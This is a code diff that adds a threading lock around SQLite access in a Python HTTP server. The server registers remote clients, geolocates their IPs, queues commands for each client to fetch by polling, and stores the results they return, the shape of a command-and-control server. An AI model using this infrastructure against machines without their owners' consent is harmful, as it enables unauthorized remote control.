@@ -96,7 +96,13 @@ DB_FILE = 'keller.db'
 # open SQLite connection shared across threads
 conn = sqlite3.connect(DB_FILE, check_same_thread=False)
 conn.row_factory = sqlite3.Row
-with conn:
+
+# lock serializes DB access; this limits concurrency but avoids corrupting
+# shared state if multiple threads try to use the connection simultaneously.
+# With many clients the server may become slower because each request must
+# acquire this lock before accessing the database.
+conn_lock = threading.Lock()
+with conn_lock, conn:
     conn.execute(
         'CREATE TABLE IF NOT EXISTS clients('
         'id TEXT PRIMARY KEY, ip TEXT, lat REAL, lon REAL,'
@@ -113,7 +119,8 @@ REMOVE_CLIENT_AFTER = int(os.environ.get('REMOVE_CLIENT_AFTER', '3600'))
 def cleanup_task():
     while True:
         cutoff = time.time() - REMOVE_CLIENT_AFTER
-        with conn:
+        # serialize cleanup operations to avoid simultaneous writes
+        with conn_lock, conn:
             conn.execute('DELETE FROM clients WHERE last_seen < ?', (cutoff,))
             conn.execute(
                 'DELETE FROM commands WHERE client_id NOT IN '
@@ -156,21 +163,22 @@ class Handler(BaseHTTPRequestHandler):
             except Exception:
                 pass
             if client_id:
-                cur = conn.cursor()
-                if cur.execute('SELECT id FROM clients WHERE id=?', (client_id,)).fetchone():
-                    cur.execute('UPDATE clients SET ip=?, last_seen=? WHERE id=?', (ip, now, client_id))
-                else:
-                    count = cur.execute('SELECT COUNT(*) FROM clients WHERE ip=?', (ip,)).fetchone()[0]
-                    lat, lon = geolocate(ip)
-                    if count > 0:
-                        lat += random.uniform(-0.02, 0.02)
-                        lon += random.uniform(-0.02, 0.02)
-                    cur.execute(
-                        'INSERT INTO clients(id, ip, lat, lon, last_seen, result) '
-                        'VALUES (?,?,?,?,?,?)',
-                        (client_id, ip, lat, lon, now, '')
-                    )
-                conn.commit()
+                with conn_lock:
+                    cur = conn.cursor()
+                    if cur.execute('SELECT id FROM clients WHERE id=?', (client_id,)).fetchone():
+                        cur.execute('UPDATE clients SET ip=?, last_seen=? WHERE id=?', (ip, now, client_id))
+                    else:
+                        count = cur.execute('SELECT COUNT(*) FROM clients WHERE ip=?', (ip,)).fetchone()[0]
+                        lat, lon = geolocate(ip)
+                        if count > 0:
+                            lat += random.uniform(-0.02, 0.02)
+                            lon += random.uniform(-0.02, 0.02)
+                        cur.execute(
+                            'INSERT INTO clients(id, ip, lat, lon, last_seen, result) '
+                            'VALUES (?,?,?,?,?,?)',
+                            (client_id, ip, lat, lon, now, '')
+                        )
+                    conn.commit()
                 body = b'Registered'
                 self.send_response(200)
                 self.send_header('Content-Length', str(len(body)))
@@ -187,18 +195,19 @@ class Handler(BaseHTTPRequestHandler):
                 payload = json.loads(data.decode())
                 cid = payload.get('client_id')
                 cmd = payload.get('command')
-                if cid and cmd and conn.execute('SELECT 1 FROM clients WHERE id=?', (cid,)).fetchone():
-                    conn.execute(
-                        'INSERT INTO commands(client_id, command, ts) VALUES (?,?,?)',
-                        (cid, cmd, now)
-                    )
-                    conn.commit()
-                    body = b'Command queued'
-                    self.send_response(200)
-                    self.send_header('Content-Length', str(len(body)))
-                    self.end_headers()
-                    self._safe_write(body)
-                    return
+                with conn_lock:
+                    if cid and cmd and conn.execute('SELECT 1 FROM clients WHERE id=?', (cid,)).fetchone():
+                        conn.execute(
+                            'INSERT INTO commands(client_id, command, ts) VALUES (?,?,?)',
+                            (cid, cmd, now)
+                        )
+                        conn.commit()
+                        body = b'Command queued'
+                        self.send_response(200)
+                        self.send_header('Content-Length', str(len(body)))
+                        self.end_headers()
+                        self._safe_write(body)
+                        return
             except Exception:
                 pass
             body = b'Bad Request'
@@ -211,15 +220,16 @@ class Handler(BaseHTTPRequestHandler):
                 payload = json.loads(data.decode())
                 cid = payload.get('client_id')
                 res = payload.get('result')
-                if cid and conn.execute('SELECT 1 FROM clients WHERE id=?', (cid,)).fetchone():
-                    conn.execute('UPDATE clients SET result=?, last_seen=? WHERE id=?', (res, now, cid))
-                    conn.commit()
-                    body = b'Result stored'
-                    self.send_response(200)
-                    self.send_header('Content-Length', str(len(body)))
-                    self.end_headers()
-                    self._safe_write(body)
-                    return
+                with conn_lock:
+                    if cid and conn.execute('SELECT 1 FROM clients WHERE id=?', (cid,)).fetchone():
+                        conn.execute('UPDATE clients SET result=?, last_seen=? WHERE id=?', (res, now, cid))
+                        conn.commit()
+                        body = b'Result stored'
+                        self.send_response(200)
+                        self.send_header('Content-Length', str(len(body)))
+                        self.end_headers()
+                        self._safe_write(body)
+                        return
             except Exception:
                 pass
             body = b'Bad Request'
@@ -234,10 +244,11 @@ class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
         parsed = urlparse(self.path)
         if parsed.path == '/clients':
-            rows = conn.execute(
-                'SELECT id, ip, lat, lon, result, last_seen FROM clients'
-            ).fetchall()
-            body = json.dumps([dict(row) for row in rows]).encode()
+            with conn_lock:
+                rows = conn.execute(
+                    'SELECT id, ip, lat, lon, result, last_seen FROM clients'
+                ).fetchall()
+                body = json.dumps([dict(row) for row in rows]).encode()
             self.send_response(200)
             self.send_header('Content-Type', 'application/json')
             self.send_header('Content-Length', str(len(body)))
@@ -246,43 +257,45 @@ class Handler(BaseHTTPRequestHandler):
         elif parsed.path == '/poll':
             qs = parse_qs(parsed.query)
             cid = qs.get('client_id', [None])[0]
-            row = conn.execute('SELECT id FROM clients WHERE id=?', (cid,)).fetchone()
-            if row:
-                conn.execute('UPDATE clients SET last_seen=? WHERE id=?', (time.time(), cid))
-                cmd_row = conn.execute(
-                    'SELECT id, command FROM commands WHERE client_id=? ORDER BY id LIMIT 1',
-                    (cid,)
-                ).fetchone()
-                cmd = None
-                if cmd_row:
-                    cmd = cmd_row['command']
-                    conn.execute('DELETE FROM commands WHERE id=?', (cmd_row['id'],))
-                conn.commit()
-                body = json.dumps({'command': cmd}).encode()
-                self.send_response(200)
-                self.send_header('Content-Type', 'application/json')
-                self.send_header('Content-Length', str(len(body)))
-                self.end_headers()
-                self._safe_write(body)
-            else:
-                self.send_response(404)
-                self.send_header('Content-Length', '0')
-                self.end_headers()
+            with conn_lock:
+                row = conn.execute('SELECT id FROM clients WHERE id=?', (cid,)).fetchone()
+                if row:
+                    conn.execute('UPDATE clients SET last_seen=? WHERE id=?', (time.time(), cid))
+                    cmd_row = conn.execute(
+                        'SELECT id, command FROM commands WHERE client_id=? ORDER BY id LIMIT 1',
+                        (cid,)
+                    ).fetchone()
+                    cmd = None
+                    if cmd_row:
+                        cmd = cmd_row['command']
+                        conn.execute('DELETE FROM commands WHERE id=?', (cmd_row['id'],))
+                    conn.commit()
+                    body = json.dumps({'command': cmd}).encode()
+                    self.send_response(200)
+                    self.send_header('Content-Type', 'application/json')
+                    self.send_header('Content-Length', str(len(body)))
+                    self.end_headers()
+                    self._safe_write(body)
+                else:
+                    self.send_response(404)
+                    self.send_header('Content-Length', '0')
+                    self.end_headers()
         elif parsed.path == '/result':
             qs = parse_qs(parsed.query)
             cid = qs.get('client_id', [None])[0]
-            row = conn.execute('SELECT result FROM clients WHERE id=?', (cid,)).fetchone()
-            if row:
-                body = json.dumps({'result': row['result']}).encode()
-                self.send_response(200)
-                self.send_header('Content-Type', 'application/json')
-                self.send_header('Content-Length', str(len(body)))
-                self.end_headers()
-                self._safe_write(body)
-            else:
-                self.send_response(404)
-                self.send_header('Content-Length', '0')
-                self.end_headers()
+            with conn_lock:
+                row = conn.execute('SELECT result FROM clients WHERE id=?', (cid,)).fetchone()
+                if row:
+                    body = json.dumps({'result': row['result']}).encode()
+                    self.send_response(200)
+                    self.send_header('Content-Type', 'application/json')
+                    self.send_header('Content-Length', str(len(body)))
+                    self.end_headers()
+                    self._safe_write(body)
+                else:
+                    self.send_response(404)
+                    self.send_header('Content-Length', '0')
+                    self.end_headers()
         elif parsed.path == '/':
             body = INDEX_PAGE.encode()
             self.send_response(200)
